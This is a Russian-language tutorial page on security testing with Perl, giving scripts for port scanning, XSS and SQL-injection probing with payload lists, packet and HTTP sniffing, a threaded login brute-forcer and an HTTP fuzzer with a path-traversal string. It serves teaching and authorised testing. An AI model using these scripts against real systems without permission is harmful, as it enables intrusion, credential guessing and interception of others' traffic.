<!doctype html>
<html lang="ru">
	<head>
		<meta charset="UTF-8">

		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="description" content="Perl Penetration Testing - Comprehensive guide to security testing with Perl">

		<title>Perl Penetration Testing | MaxKonovalov38</title>

		<link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png">
		<link rel="manifest" href="../../favicon/site.webmanifest">

		<link rel="stylesheet" href="../../css/reset.css">
		<link rel="stylesheet" href="../../css/ch_styles.css">
		<link rel="stylesheet" href="../../css/scripts_styles.css">

		<script src="../../js/navigation.js" defer></script>
  	</head>
  	<body>
  		<header>
  			<h1>MaxKonovalov38</h1>
            <button class="menu-button">☰</button>
  		</header>
		<main>
  			<nav>
  				<p>Проекты:</p>
  				<p><a href="../../index.html">Главная</a></p>
  				<p><a href="../main/rust_main.html">Rust</a></p>
  				<p><a href="../main/perl_main.html">Perl</a></p>
  				<p><a href="../main/python_main.html">Python</a></p>
  				<p>Статьи:</p>
  				<p><a href="../article_perl/perl_scripts.html">100 Perl Scripts</a></p>
  				<p><a href="../article_perl/perl_5.40.html">Perl v.5.40</a></p>
  				<p><a href="../article_perl/perl_linux_automation.html">Perl Linux Automation</a></p>
  				<p><a href="../article_perl/perl_ai_chatbot.html">Perl AI Chat-bot</a></p>
  				<p><a href="../article_perl/perl_oop.html">Perl OOP</a></p>
  				<p><a href="../article_perl/perl_debugging.html">Perl Debug Code</a></p>
  				<p><a href="../article_perl/perl_pentest.html">Perl Pentest</a></p>
  			</nav>
  			<article>
  				<h2>Тестирование безопасности с использованием Perl</h2>
  				<p>Полное руководство по тестированию безопасности с использованием Perl, включая примеры скриптов и инструментов.</p>
                <p class="warning">Внимание: Используйте эти скрипты только для тестирования систем, на которые у вас есть разрешение. Несанкционированное тестирование безопасности может быть незаконным.</p>

				<h3>1. Сканирование портов</h3>
				<div class="script">
					<h4>1.1 Базовый сканер портов</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">IO::Socket</span>;

<span class="sub">sub</span> <span class="function">scan_port</span> {
    <span class="my">my</span> (<span class="variable">$host</span>, <span class="variable">$port</span>) = <span class="variable">@_</span>;
    <span class="my">my</span> <span class="variable">$socket</span> = <span class="function">IO::Socket::INET</span><span class="operator">-></span><span class="function">new</span>(
        PeerAddr => <span class="variable">$host</span>,
        PeerPort => <span class="variable">$port</span>,
        Proto    => <span class="string">'tcp'</span>,
        Timeout  => <span class="number">1</span>
    );
    <span class="if">if</span> (<span class="variable">$socket</span>) {
        <span class="print">print</span> <span class="string">"Port $port is open\n"</span>;
        <span class="variable">$socket</span><span class="operator">-></span><span class="function">close</span>;
        <span class="return">return</span> <span class="number">1</span>;
    }
    <span class="return">return</span> <span class="number">0</span>;
}

<span class="my">my</span> <span class="variable">$host</span> = <span class="string">'example.com'</span>;
<span class="for">for</span> <span class="my">my</span> <span class="variable">$port</span> (<span class="number">1</span>..<span class="number">1024</span>) {
    <span class="function">scan_port</span>(<span class="variable">$host</span>, <span class="variable">$port</span>);
}</code></pre>
					<p>Базовый сканер портов, проверяющий доступность TCP-портов.</p>
				</div>

				<div class="script">
					<h4>1.2 Многопоточный сканер портов</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">IO::Socket</span>;
<span class="use">use</span> <span class="package">Thread::Queue</span>;
<span class="use">use</span> <span class="package">threads</span>;

<span class="my">my</span> <span class="variable">$queue</span> = <span class="function">Thread::Queue</span><span class="operator">-></span><span class="function">new</span>;
<span class="my">my</span> <span class="variable">$host</span> = <span class="string">'example.com'</span>;
<span class="my">my</span> <span class="variable">@threads</span>;

<span class="sub">sub</span> <span class="function">worker</span> {
    <span class="while">while</span> (<span class="my">my</span> <span class="variable">$port</span> = <span class="variable">$queue</span><span class="operator">-></span><span class="function">dequeue</span>) {
        <span class="function">scan_port</span>(<span class="variable">$host</span>, <span class="variable">$port</span>);
    }
}

<span class="comment"># Создаем пул потоков</span>
<span class="for">for</span> (<span class="number">1</span>..<span class="number">10</span>) {
    <span class="function">push</span> <span class="variable">@threads</span>, <span class="function">threads</span><span class="operator">-></span><span class="function">create</span>(<span class="string">\&worker</span>);
}

<span class="comment"># Добавляем порты в очередь</span>
<span class="for">for</span> <span class="my">my</span> <span class="variable">$port</span> (<span class="number">1</span>..<span class="number">1024</span>) {
    <span class="variable">$queue</span><span class="operator">-></span><span class="function">enqueue</span>(<span class="variable">$port</span>);
}

<span class="comment"># Завершаем потоки</span>
<span class="variable">$queue</span><span class="operator">-></span><span class="function">end</span>;
<span class="variable">$_</span><span class="operator">-></span><span class="function">join</span> <span class="for">for</span> <span class="variable">@threads</span>;</code></pre>
					<p>Многопоточный сканер портов для ускорения проверки.</p>
				</div>

				<h3>2. Тестирование веб-приложений</h3>
				<div class="script">
					<h4>2.1 Проверка уязвимостей XSS</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">LWP::UserAgent</span>;
<span class="use">use</span> <span class="package">HTML::Parser</span>;

<span class="my">my</span> <span class="variable">$ua</span> = <span class="function">LWP::UserAgent</span><span class="operator">-></span><span class="function">new</span>;
<span class="my">my</span> <span class="variable">$url</span> = <span class="string">'http://example.com/search'</span>;

<span class="my">my</span> <span class="variable">@xss_payloads</span> = (
    <span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>,
    <span class="string">'&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'</span>,
    <span class="string">'javascript:alert(1)'</span>
);

<span class="for">foreach</span> <span class="my">my</span> <span class="variable">$payload</span> (<span class="variable">@xss_payloads</span>) {
    <span class="my">my</span> <span class="variable">$response</span> = <span class="variable">$ua</span><span class="operator">-></span><span class="function">get</span>(<span class="string">"$url?q=$payload"</span>);
    <span class="if">if</span> (<span class="variable">$response</span><span class="operator">-></span><span class="function">content</span> =~ <span class="regex">/\Q$payload\E/</span>) {
        <span class="print">print</span> <span class="string">"Potential XSS vulnerability found with payload: $payload\n"</span>;
    }
}</code></pre>
					<p>Скрипт для проверки уязвимостей XSS в веб-приложениях.</p>
				</div>

				<div class="script">
					<h4>2.2 Проверка SQL-инъекций</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">LWP::UserAgent</span>;

<span class="my">my</span> <span class="variable">$ua</span> = <span class="function">LWP::UserAgent</span><span class="operator">-></span><span class="function">new</span>;
<span class="my">my</span> <span class="variable">$url</span> = <span class="string">'http://example.com/login'</span>;

<span class="my">my</span> <span class="variable">@sql_payloads</span> = (
    <span class="string">"' OR '1'='1"</span>,
    <span class="string">"' OR '1'='1' -- "</span>,
    <span class="string">"' OR '1'='1' # "</span>,
    <span class="string">"' OR '1'='1' /* "</span>
);

<span class="for">foreach</span> <span class="my">my</span> <span class="variable">$payload</span> (<span class="variable">@sql_payloads</span>) {
    <span class="my">my</span> <span class="variable">$response</span> = <span class="variable">$ua</span><span class="operator">-></span><span class="function">post</span>(
        <span class="variable">$url</span>,
        [
            username => <span class="string">"admin$payload"</span>,
            password => <span class="string">'password'</span>
        ]
    );
    
    <span class="if">if</span> (<span class="variable">$response</span><span class="operator">-></span><span class="function">content</span> =~ <span class="regex">/welcome|success|logged in/i</span>) {
        <span class="print">print</span> <span class="string">"Potential SQL injection vulnerability found with payload: $payload\n"</span>;
    }
}</code></pre>
					<p>Скрипт для проверки уязвимостей SQL-инъекций.</p>
				</div>

				<h3>3. Анализ сетевого трафика</h3>
				<div class="script">
					<h4>3.1 Сниффер пакетов</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">Net::Pcap</span>;
<span class="use">use</span> <span class="package">NetPacket::Ethernet</span>;
<span class="use">use</span> <span class="package">NetPacket::IP</span>;
<span class="use">use</span> <span class="package">NetPacket::TCP</span>;

<span class="my">my</span> <span class="variable">$err</span>;
<span class="my">my</span> <span class="variable">$dev</span> = <span class="function">Net::Pcap::lookupdev</span>(<span class="variable">\$err</span>);
<span class="my">my</span> <span class="variable">$pcap</span> = <span class="function">Net::Pcap::open_live</span>(<span class="variable">$dev</span>, <span class="number">65535</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="variable">\$err</span>);

<span class="sub">sub</span> <span class="function">process_packet</span> {
    <span class="my">my</span> (<span class="variable">$user_data</span>, <span class="variable">$header</span>, <span class="variable">$packet</span>) = <span class="variable">@_</span>;
    
    <span class="my">my</span> <span class="variable">$eth</span> = <span class="function">NetPacket::Ethernet</span><span class="operator">-></span><span class="function">decode</span>(<span class="variable">$packet</span>);
    <span class="if">if</span> (<span class="variable">$eth</span><span class="operator">-></span>{type} == <span class="number">0x0800</span>) {  <span class="comment"># IPv4</span>
        <span class="my">my</span> <span class="variable">$ip</span> = <span class="function">NetPacket::IP</span><span class="operator">-></span><span class="function">decode</span>(<span class="variable">$eth</span><span class="operator">-></span>{data});
        <span class="if">if</span> (<span class="variable">$ip</span><span class="operator">-></span>{proto} == <span class="number">6</span>) {  <span class="comment"># TCP</span>
            <span class="my">my</span> <span class="variable">$tcp</span> = <span class="function">NetPacket::TCP</span><span class="operator">-></span><span class="function">decode</span>(<span class="variable">$ip</span><span class="operator">-></span>{data});
            <span class="print">print</span> <span class="string">"$ip->{src_ip}:$tcp->{src_port} -> $ip->{dest_ip}:$tcp->{dest_port}\n"</span>;
        }
    }
}

<span class="function">Net::Pcap::loop</span>(<span class="variable">$pcap</span>, <span class="number">-1</span>, <span class="string">\&process_packet</span>, <span class="string">''</span>);
<span class="function">Net::Pcap::close</span>(<span class="variable">$pcap</span>);</code></pre>
					<p>Базовый сниффер пакетов для анализа сетевого трафика.</p>
				</div>

				<div class="script">
					<h4>3.2 Анализ HTTP-трафика</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">Net::Pcap</span>;
<span class="use">use</span> <span class="package">NetPacket::Ethernet</span>;
<span class="use">use</span> <span class="package">NetPacket::IP</span>;
<span class="use">use</span> <span class="package">NetPacket::TCP</span>;

<span class="sub">sub</span> <span class="function">process_http</span> {
    <span class="my">my</span> (<span class="variable">$user_data</span>, <span class="variable">$header</span>, <span class="variable">$packet</span>) = <span class="variable">@_</span>;
    
    <span class="my">my</span> <span class="variable">$eth</span> = <span class="function">NetPacket::Ethernet</span><span class="operator">-></span><span class="function">decode</span>(<span class="variable">$packet</span>);
    <span class="if">if</span> (<span class="variable">$eth</span><span class="operator">-></span>{type} == <span class="number">0x0800</span>) {
        <span class="my">my</span> <span class="variable">$ip</span> = <span class="function">NetPacket::IP</span><span class="operator">-></span><span class="function">decode</span>(<span class="variable">$eth</span><span class="operator">-></span>{data});
        <span class="if">if</span> (<span class="variable">$ip</span><span class="operator">-></span>{proto} == <span class="number">6</span>) {
            <span class="my">my</span> <span class="variable">$tcp</span> = <span class="function">NetPacket::TCP</span><span class="operator">-></span><span class="function">decode</span>(<span class="variable">$ip</span><span class="operator">-></span>{data});
            <span class="if">if</span> (<span class="variable">$tcp</span><span class="operator">-></span>{data}) {
                <span class="if">if</span> (<span class="variable">$tcp</span><span class="operator">-></span>{data} =~ <span class="regex">/^(GET|POST|PUT|DELETE|HEAD|OPTIONS|TRACE|CONNECT)/</span>) {
                    <span class="print">print</span> <span class="string">"HTTP Request:\n$tcp->{data}\n"</span>;
                }
                <span class="if">elsif</span> (<span class="variable">$tcp</span><span class="operator">-></span>{data} =~ <span class="regex">/^HTTP\/\d\.\d/</span>) {
                    <span class="print">print</span> <span class="string">"HTTP Response:\n$tcp->{data}\n"</span>;
                }
            }
        }
    }
}

<span class="my">my</span> <span class="variable">$err</span>;
<span class="my">my</span> <span class="variable">$dev</span> = <span class="function">Net::Pcap::lookupdev</span>(<span class="variable">\$err</span>);
<span class="my">my</span> <span class="variable">$pcap</span> = <span class="function">Net::Pcap::open_live</span>(<span class="variable">$dev</span>, <span class="number">65535</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="variable">\$err</span>);

<span class="comment"># Фильтр для HTTP-трафика</span>
<span class="my">my</span> <span class="variable">$filter</span> = <span class="string">'tcp port 80 or tcp port 443'</span>;
<span class="function">Net::Pcap::compile</span>(<span class="variable">$pcap</span>, <span class="variable">\$filter</span>, <span class="variable">$filter</span>, <span class="number">0</span>, <span class="number">0</span>);
<span class="function">Net::Pcap::setfilter</span>(<span class="variable">$pcap</span>, <span class="variable">$filter</span>);

<span class="function">Net::Pcap::loop</span>(<span class="variable">$pcap</span>, <span class="number">-1</span>, <span class="string">\&process_http</span>, <span class="string">''</span>);
<span class="function">Net::Pcap::close</span>(<span class="variable">$pcap</span>);</code></pre>
					<p>Скрипт для анализа HTTP-трафика в сети.</p>
				</div>

				<h3>4. Брутфорс и фаззинг</h3>
				<div class="script">
					<h4>4.1 Брутфорс HTTP-авторизации</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">LWP::UserAgent</span>;
<span class="use">use</span> <span class="package">Thread::Queue</span>;
<span class="use">use</span> <span class="package">threads</span>;

<span class="my">my</span> <span class="variable">$url</span> = <span class="string">'http://example.com/login'</span>;
<span class="my">my</span> <span class="variable">$queue</span> = <span class="function">Thread::Queue</span><span class="operator">-></span><span class="function">new</span>;
<span class="my">my</span> <span class="variable">@threads</span>;

<span class="sub">sub</span> <span class="function">try_password</span> {
    <span class="my">my</span> <span class="variable">$ua</span> = <span class="function">LWP::UserAgent</span><span class="operator">-></span><span class="function">new</span>;
    <span class="while">while</span> (<span class="my">my</span> <span class="variable">$password</span> = <span class="variable">$queue</span><span class="operator">-></span><span class="function">dequeue</span>) {
        <span class="my">my</span> <span class="variable">$response</span> = <span class="variable">$ua</span><span class="operator">-></span><span class="function">post</span>(
            <span class="variable">$url</span>,
            [
                username => <span class="string">'admin'</span>,
                password => <span class="variable">$password</span>
            ]
        );
        <span class="if">if</span> (<span class="variable">$response</span><span class="operator">-></span><span class="function">is_success</span> && 
            <span class="variable">$response</span><span class="operator">-></span><span class="function">content</span> !~ <span class="regex">/invalid|error|failed/i</span>) {
            <span class="print">print</span> <span class="string">"Found password: $password\n"</span>;
            <span class="variable">$queue</span><span class="operator">-></span><span class="function">end</span>;
        }
    }
}

<span class="comment"># Загружаем словарь паролей</span>
<span class="open">open</span> <span class="my">my</span> <span class="variable">$fh</span>, <span class="string">'&lt;'</span>, <span class="string">'passwords.txt'</span> <span class="if">or</span> <span class="function">die</span> <span class="string">"Cannot open passwords.txt: $!"</span>;
<span class="while">while</span> (<span class="variable">my</span> <span class="variable">$line</span> = <span class="variable">$fh</span><span class="operator">-></span><span class="function">getline</span>) {
    <span class="function">chomp</span> <span class="variable">$line</span>;
    <span class="variable">$queue</span><span class="operator">-></span><span class="function">enqueue</span>(<span class="variable">$line</span>);
}
<span class="close">close</span> <span class="variable">$fh</span>;

<span class="comment"># Создаем потоки</span>
<span class="for">for</span> (<span class="number">1</span>..<span class="number">10</span>) {
    <span class="function">push</span> <span class="variable">@threads</span>, <span class="function">threads</span><span class="operator">-></span><span class="function">create</span>(<span class="string">\&try_password</span>);
}

<span class="variable">$_</span><span class="operator">-></span><span class="function">join</span> <span class="for">for</span> <span class="variable">@threads</span>;</code></pre>
					<p>Многопоточный брутфорсер для HTTP-авторизации.</p>
				</div>

				<div class="script">
					<h4>4.2 Фаззер HTTP-запросов</h4>
<pre><code><span class="use">use</span> <span class="strict">strict</span>;
<span class="use">use</span> <span class="warnings">warnings</span>;

<span class="use">use</span> <span class="package">LWP::UserAgent</span>;
<span class="use">use</span> <span class="package">HTTP::Request</span>;

<span class="my">my</span> <span class="variable">$ua</span> = <span class="function">LWP::UserAgent</span><span class="operator">-></span><span class="function">new</span>;
<span class="my">my</span> <span class="variable">$url</span> = <span class="string">'http://example.com/api'</span>;

<span class="my">my</span> <span class="variable">@fuzz_values</span> = (
    <span class="string">''</span>,
    <span class="string">'null'</span>,
    <span class="string">'undefined'</span>,
    <span class="string">'true'</span>,
    <span class="string">'false'</span>,
    <span class="string">'NaN'</span>,
    <span class="string">'Infinity'</span>,
    <span class="string">'-Infinity'</span>,
    <span class="string">'[]'</span>,
    <span class="string">'{}'</span>,
    <span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>,
    <span class="string">'../../../../etc/passwd'</span>,
    <span class="string">'%00'</span>,
    <span class="string">'%0a'</span>,
    <span class="string">'%0d'</span>
);

<span class="for">foreach</span> <span class="my">my</span> <span class="variable">$value</span> (<span class="variable">@fuzz_values</span>) {
    <span class="my">my</span> <span class="variable">$request</span> = <span class="function">HTTP::Request</span><span class="operator">-></span><span class="function">new</span>(
        POST => <span class="variable">$url</span>,
        [
            'Content-Type' => <span class="string">'application/json'</span>,
            'X-Test-Header' => <span class="variable">$value</span>
        ],
        <span class="string">"{\"data\":\"$value\"}"</span>
    );
    
    <span class="my">my</span> <span class="variable">$response</span> = <span class="variable">$ua</span><span class="operator">-></span><span class="function">request</span>(<span class="variable">$request</span>);
    
    <span class="if">if</span> (<span class="variable">$response</span><span class="operator">-></span><span class="function">code</span> >= <span class="number">500</span>) {
        <span class="print">print</span> <span class="string">"Server error with value: $value\n"</span>;
        <span class="print">print</span> <span class="string">"Response: "</span> . <span class="variable">$response</span><span class="operator">-></span><span class="function">content</span> . <span class="string">"\n"</span>;
    }
}</code></pre>
					<p>Фаззер для тестирования обработки HTTP-запросов.</p>
				</div>

				<p>Это руководство охватывает основные аспекты тестирования безопасности с использованием Perl, включая:</p>
				<ul>
					<li>Сканирование портов и сетевых сервисов</li>
					<li>Тестирование веб-приложений на уязвимости</li>
					<li>Анализ сетевого трафика</li>
					<li>Брутфорс и фаззинг</li>
				</ul>
			</article>
		</main>
   		<footer>&copy; Максим Коновалов</footer>
	</body>
</html> 